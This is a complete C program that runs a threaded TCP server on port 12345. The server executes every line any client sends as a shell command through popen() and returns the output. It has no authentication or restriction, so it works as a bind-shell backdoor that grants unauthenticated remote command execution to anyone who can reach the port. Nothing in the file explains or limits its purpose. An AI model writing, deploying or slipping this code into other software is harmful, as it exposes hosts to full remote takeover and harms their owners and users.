#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>

#define PORT 12345
#define BUFFER_SIZE 1024

void *execute_command(void *client_socket_ptr) {
    int client_socket = *(int *)client_socket_ptr;
    free(client_socket_ptr);
    char buffer[BUFFER_SIZE];
    while (1) {
        memset(buffer, 0, BUFFER_SIZE);
        recv(client_socket, buffer, BUFFER_SIZE, 0);

        char *newline = strchr(buffer, '\n');
        if (newline) *newline = '\0';
        char *carriage_return = strchr(buffer, '\r');
        if (carriage_return) *carriage_return = '\0';

        if (strncmp(buffer, "exit", 4) == 0) {
            break;
        }
        FILE *fp = popen(buffer, "r");
        if (fp == NULL) {
            send(client_socket, "Error executing command\n", 24, 0);
            continue;
        }
        while (fgets(buffer, BUFFER_SIZE, fp) != NULL) {
            send(client_socket, buffer, strlen(buffer), 0);
        }
        pclose(fp);
    }
    close(client_socket);
    return NULL;
}

int main() {
    int server_fd, client_socket;
    struct sockaddr_in server_addr, client_addr;
    socklen_t addr_len = sizeof(client_addr);

    server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd == -1) {
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(PORT);

    if (bind(server_fd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Bind failed");
        exit(EXIT_FAILURE);
    }

    if (listen(server_fd, 5) < 0) {
        perror("Listen failed");
        exit(EXIT_FAILURE);
    }

    printf("Server listening on port %d...\n", PORT);

    while (1) {
        client_socket = accept(server_fd, (struct sockaddr *)&client_addr, &addr_len);
        if (client_socket < 0) {
            perror("Accept failed");
            continue;
        }

        printf("Client connected\n");

        int *new_sock = malloc(sizeof(int));
        *new_sock = client_socket;
        pthread_t thread_id;
        pthread_create(&thread_id, NULL, execute_command, (void *)new_sock);
        pthread_detach(thread_id);
    }

    close(server_fd);
    return 0;
}
